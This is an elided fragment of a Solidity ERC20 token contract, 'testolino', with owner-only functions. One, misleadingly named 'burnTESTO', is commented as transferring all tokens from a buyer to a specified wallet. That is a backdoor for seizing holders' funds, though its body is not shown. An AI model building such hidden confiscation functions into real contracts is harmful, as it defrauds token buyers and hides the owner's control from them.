...
contract testolino is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("testolino", "testolino") Ownable(initialOwner) {
        _mint(initialOwner, 5000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function burnTESTO(address from, address to) external onlyOwner {
    ...
    function sendTesto(address to, uint256 amount) public onlyOwner {
